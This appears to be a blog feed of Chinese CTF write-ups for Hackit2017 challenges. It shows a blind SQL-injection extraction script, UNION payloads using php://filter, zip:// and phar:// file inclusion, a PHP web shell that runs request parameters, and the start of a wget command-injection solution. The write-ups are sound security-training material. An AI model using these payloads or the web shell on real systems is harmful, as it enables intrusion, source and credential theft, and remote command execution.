df3U9fXFYoDeAIzEgQIEgQIEgQIEgQIEgQIEgQIEgRUm+hPrjg1LZgUlybqbxZ0PIKm9zh+QV/8jsf9MiNBhCBBgCBBgCBBgCBBgCBBwLr83XSo6Be53i+/eM1Pvv39lCO6CMGXESQIECQIECQIECQIECQIWHcR2q/SNvWwn9xlXPy7liaPEZg0+bAmG/bvD+ATMxIECBIECBIECBIECBIECBIEHDQ/mTxUdN/1Qvkz1Rvb7z/ZyXvt//dPij9ju7+hkSBBgCBBgCBBgCBBgCBBQLX83eSZo9pX3+p+vf/ME06h3fzvk5S/oZEgQYAgQYAgQYAgQYAgQYAgQcC6i9C+phNUO5YLJtsYHfWVv760MvkuzORrL2PnI7/MSBAhSBAgSBAgSBAgSBAgSBBwUP6ebGo+2VZm6fo7I8+sPh8NtVjrry9LTD5EMxIECBIECBIECBIECBIECBIEtDTRr5usdO8P4Bc0u5nc6n7dZP3djAQBggQBggQBggQBggQBggQBB+Xv6p1ud0SpH3W6f9nJDdFHJgdw/XzhpaYXC8xIECBIECBIECBIECBIECBIEFDt/V2vGy6v8MxNyt/VU6VDvffIMw/M3b/XJ2YkCBAkCBAkCBAkCBAkCBAkCFjv/r6+IXrpmbu/J+9V79HxzNbbTb+ByQ7yZiQIECQIECQIECQIECQIECQIECQIOFhHaqrKN60OFTU10f8Fb4L83/V3Q5oWzY7uZUaCAEGCAEGCAEGCAEGCAEGCgPtN9McKspNF0rrrZf3619Lxdkb9ye7zGgVMEyQIECQIECQIECQIECQIWDfRv76f93qVdt/Y+sErsUl58gzZph30Rft/19H4zUgQIEgQIEgQIEgQIEgQIEgQcHCG7OQW3etNQppqr2Nl/aNa/2Rbm/2/63qh/IgZCQIECQIECQIECQIECQIECQIOyt+Tm3k7auKT7UTq9kfb1Kdlsv3LZP26aau7GQkCBAkCBAkCBAkCBAkCBAkCBAkCqq9RXG/iU7/m9bbu9RcWOnQs5Q1rej1kyYwEAYIEAYIEAYIEAYIEAYIEAeszZJ/Z/nypPv5nVp+XmobadNbq9eY+HW+CaKIPjQQJAgQJAgQJAgQJAgQJAta7v5/Zr2epaZPy9dY8Hd3uj+416fqZCUt2f8M0QYIAQYIAQYIAQYIAQYKAdfn7+r7dpevbzzt2yp9+OP7fX0993JMLG/UBmJEgQJAgQJAgQJAgQJAgQJAgoNr7u0mxy0dT5XTysvuaOq1fb7Qy+bzqT9aMBAGCBAGCBAGCBAGCBAGCBAEH5e+lpn4gxQFcr3QfVZ8nK/hLHYsNTQOoa6qJm5EgQJAgQJAgQJAgQJAgQJAgQJAgoLqO9ExH6xKTC1nXz6udXJ66/spG8V5HzEgQIEgQIEgQIEgQIEgQIEgQ8PXl76ZjVYuf/GTssNTJF0mOav37A6s/2clTF8xIECBIECBIECBIECBIECBIEFAtf0921t/X1Oxm31EXoWKhuV7rPypqF01uP59kRoIAQYIAQYIAQYIAQYIAQYKAg/L3ZPn4uusF9CaTG6KLA5i8Zv1xm5EgQJAgQJAgQJAgQJAgQJAg4P0LNt7CdWYkCBAkCBAkCBAkCBAkCBAkCBAkCPgLVlXCW8nFW3sAAAAASUVORK5CYII="</span></div><div class="line"></div><div class="line">f = open(<span class="string">"flag.png"</span>,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">f.write(base64.b64decode(pngdata))</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
<p>得到一张二维码，扫后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;5a9f1ce5c7359a1b1076b5143b946a3b&#125;</div></pre></td></tr></table></figure></p>
<h1 id="简单的apk"><a href="#简单的apk" class="headerlink" title="简单的apk"></a>简单的apk</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">能够通过APK认证的字符串即为本题flag</div><div class="line"></div><div class="line">下载APK(https://play.chinaisg.org/attachment/download/simple-code.apk)</div></pre></td></tr></table></figure>
<p>其实这是mobile，干脆写在这里不另开了。用jeb打开，然后发现是kotlin，先果断放弃哈哈哈。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;秘密文件&quot;&gt;&lt;a href=&quot;#秘密文件&quot; class=&quot;headerlink&quot; title=&quot;秘密文件&quot;&gt;&lt;/a&gt;秘密文件&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-Weekands of hacker-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/</id>
    <published>2017-08-28T11:00:09.000Z</published>
    <updated>2017-08-28T11:25:24.982Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-Weekands of hacker-writeup<br>脑脑脑洞题？<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Try to find something weird here...</div><div class="line">Attachment: (none)</div><div class="line">Webpage: (none)</div><div class="line">Hint: Format answer is h4ck1t&#123;&lt;something&gt;&#125;. You must type right flag on keyboard, where? Feel you real hacker. Hide</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>没有给出网址，那就只能在<code>https://ctf.com.ua</code>里咯。</p>
<p>在<code>https://ctf.com.ua/js/jquery.js</code>里有一段：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">typer:<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</div><div class="line">    $m=[<span class="number">70</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">74</span>,<span class="number">71</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">81</span>,<span class="number">95</span>];<span class="comment">//times alt is pressed for Access Granted</span></div><div class="line">    $c=Typer.counter<span class="number">-211</span>;</div><div class="line">	<span class="keyword">if</span> (!Typer.failed &amp;  $c&gt;=<span class="number">0</span>)&#123;</div><div class="line">		<span class="keyword">if</span> (!(key==$m[$c]-$c))&#123;</div><div class="line">			Typer.failed=<span class="literal">true</span>;</div><div class="line">			Typer.makeDenied();</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($c+<span class="number">1</span>==$m.length)&#123;</div><div class="line">			Typer.makeAccess()</div><div class="line">		&#125;</div><div class="line">	&#125;<span class="comment">// remove all existing popuccess();</span></div><div class="line">&#125;,</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">""</span></div><div class="line">m = [<span class="number">70</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">74</span>,<span class="number">71</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">81</span>,<span class="number">95</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</div><div class="line">    key += chr(m[i]-i)</div><div class="line">print(key)</div></pre></td></tr></table></figure>
<p>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FEELREALHACKER</div></pre></td></tr></table></figure></p>
<p>再把它转成小写，flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;feelrealhacker&#125;</div></pre></td></tr></table></figure></p>
<h1 id="tucao"><a href="#tucao" class="headerlink" title="tucao"></a>tucao</h1><p>这是脑洞题？…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-Weekands of hacker-writeup&lt;br&gt;脑脑脑洞题？&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-V1rus3pidem1c-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/</id>
    <published>2017-08-28T07:42:03.000Z</published>
    <updated>2017-08-28T11:10:06.334Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-V1rus3pidem1c-writeup<br>sql注入<br>php伪协议：php://filter，zip://，phar://<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!</div><div class="line"></div><div class="line">Attachment: (none)</div><div class="line"></div><div class="line">Webpage: http://tasks.ctf.com.ua:13372</div><div class="line"></div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<p>先看看基本的功能，你可以选择对应的国家，然后上传你的virus，但题目没有返回上传后的保存的文件路径信息。</p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>点一下send，会发现url变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany</div></pre></td></tr></table></figure></p>
<p>对于get参数，首先想的一般是sql注入；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://tasks.ctf.com.ua:13372/index.php?country=Germany</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/11.png?raw=true" alt=""></p>
<p>接下去用下面的脚本注出数据：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://tasks.ctf.com.ua:13372/index.php?country="</span> + payload</div><div class="line">	<span class="comment"># headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line">	content = requests.get(url,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"Select virus for Germany"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x57484154415245594f55444f494e4748455245)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x636f756e7472696573)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(countryID,0x3a,countryName,0x3a,scriptPath%09SEPARATOR%090x3c62723e)%09FROM%09countries)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">"' or (select ascii(substr("</span> +generateTarget(target) + <span class="string">" from "</span>+ str(i) +<span class="string">" for 1))&lt;= "</span>+str(midNum) +<span class="string">" )%23"</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="comment"># print recv</span></div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			<span class="comment"># print 'cuowu'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># print 'chenggong'</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line"></div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			<span class="comment"># print rightNum</span></div><div class="line">			<span class="comment"># raw_input()</span></div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The tables:"</span></div><div class="line">	target = <span class="string">"tables"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The columns:"</span></div><div class="line">	target = <span class="string">"columns"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The data:"</span></div><div class="line">	target = <span class="string">"data"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p>得到数据库WHATAREYOUDOINGHERE中countries表中的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">countryID:countryName:scriptPath</div><div class="line">1:Germany:country/ge.php</div><div class="line">2:Turkmenistan:country/tu.php</div><div class="line">3:Netherlands:country/ne.php</div><div class="line">4:Serbia:country/se.php</div><div class="line">5:Turkey:country/tk.php</div><div class="line">6:France:country/fr.php</div><div class="line">7:UK:country/uk.php</div><div class="line">8:Russia:country/ru.php</div><div class="line">9:USA:country/us.php</div><div class="line">10:Canada:country/ca.php</div></pre></td></tr></table></figure></p>
<h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>接下来看看还能做啥。初步尝试发现应该是只有1列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1 -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/12.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=Germany&apos; union select 1,2 -- -</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/13.png?raw=true" alt=""></p>
<p>尝试使用php伪协议：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=index.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p>base64解码一下，其中有段code：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'country'</span>]))&#123;</div><div class="line"></div><div class="line">			$link = mysqli_connect(<span class="string">"127.0.0.1"</span>, <span class="string">"beeber"</span>, <span class="string">"eouejvnbinrwviewrJNHUFEjnkwfowe"</span>, <span class="string">"WHATAREYOUDOINGHERE"</span>);</div><div class="line"></div><div class="line">			$result = mysqli_query($link, <span class="string">"SELECT scriptPath FROM countries WHERE countryName='"</span>.$_GET[<span class="string">'country'</span>].<span class="string">"';"</span>);</div><div class="line">			$res_include = $result-&gt;fetch_object()-&gt;scriptPath;</div><div class="line">			<span class="comment">//echo 'Get file: '.$res_include.'&lt;br&gt;&lt;br&gt;';</span></div><div class="line"></div><div class="line">			<span class="keyword">include</span> $res_include;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>include哪一个页面是根据从数据库中取出的脚本的路径决定的。根据我们前面利用脚本注出来的结果，我们看看country/ge.php中的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$target_dir = <span class="string">"uploads/"</span>;</div><div class="line">	$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line">	move_uploaded_file($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>], $target_file);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>从country/ge.php源码中，我们知道了文件上传后保存在uploads文件夹下，文件名也没有改变。</p>
<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p>直接上传php文件再去访问uploads下的文件是无法解析的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/14.png?raw=true" alt=""></p>
<p>可以利用zip协议或者phar协议来进行文件包含。</p>
<p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system(<span class="string">'ls'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>打包成chybeta.zip，上传后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;zip://uploads/chybeta.zip%23chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p>或者访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;phar://uploads/chybeta.zip/chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/15.png?raw=true" alt=""></p>
<p>接下去我们利用php伪协议读取iulersiueruigfuihseruhgi.php的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?country=&apos; union select &apos;php://filter/read=convert.base64-encode/resource=iulersiueruigfuihseruhgi.php</div></pre></td></tr></table></figure></p>
<p>解码后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;$QL&amp;LFI=FR13ND$&#125;</div></pre></td></tr></table></figure></p>
<h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><p>chybeta.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system($_GET[<span class="string">'chybeta'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上传后可以直接访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tasks.ctf.com.ua:13372/index.php?chybeta=ls&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/16.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-source:http://tasks.ctf.com.ua:13372/index.php?chybeta=cat iulersiueruigfuihseruhgi.php&amp;country=&apos; union select &apos;uploads/chybeta.php&apos; -- -</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/17.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-V1rus3pidem1c-writeup&lt;br&gt;sql注入&lt;br&gt;php伪协议：php://filter，zip://，phar://&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-B3tterS0ci4lN3twork-writeup</title>
    <link href="http://yoursite.com/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/"/>
    <id>http://yoursite.com/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/</id>
    <published>2017-08-27T23:51:05.000Z</published>
    <updated>2017-08-28T10:52:19.176Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-B3tterS0ci4lN3twork-writeup<br>命令注入<br>wget-cve利用<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: You know what to do!</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13374</div><div class="line">Hint: Try to find some known cves) Hide</div></pre></td></tr></table></figure>
<p>有一个注册Register功能，和登陆Auth功能。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/1.png?raw=true" alt=""></p>
<p>在注册完成并登录后，会跳到profile.php页面：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/2.png?raw=true" alt=""></p>
<p>右上角有Send Message和Get Message功能。我们试着写一条信息发送给自己：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/3.png?raw=true" alt=""></p>
<p>然后到Get Message功能处，发现是存在XSS漏洞的。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/4.png?raw=true" alt=""></p>
<p>但经过一番测试，这里没办法进一步的利用。回到profile.php。这里有两个功能，一个是修改密码，另一个是根据你填入的图片地址获得Your avatar。</p>
<p>这里我们填上一张放在自己服务器上的图片</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/5.png?raw=true" alt=""></p>
<p>提交后用burp看一下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/6.png?raw=true" alt=""></p>
<p>查看服务器log，发现是wget/1.15：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/7.png?raw=true" alt=""></p>
<p>所以服务器端应该是用wget 我们填入图片的地址，然后保存到avatars/yourhost/xx.jpg。而且只允许jpg/png/gif。若是php文件，在被wget完成后检测后会被删除。</p>
<h1 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h1><p>从上面的图片来看，假设后端的wget语句(约莫)如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget  -r -P avatars  -A &apos;*.jpg,*.png,*.gif&apos;  $url</div></pre></td></tr></table></figure></p>
